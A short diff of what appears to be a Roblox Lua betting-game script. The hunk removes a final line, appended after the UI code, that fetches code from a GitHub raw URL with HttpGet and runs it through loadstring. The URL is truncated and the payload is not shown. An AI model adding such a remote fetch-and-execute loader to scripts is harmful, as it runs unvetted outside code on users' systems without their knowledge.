@@ -1427,4 +1427,3 @@ end)
 Footer.Text = string.format("Rolls 0 • Next #1 • Bet %d", betAmount)
 updateToggleUI()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PHON94/1/refs/heads/main/..."))()
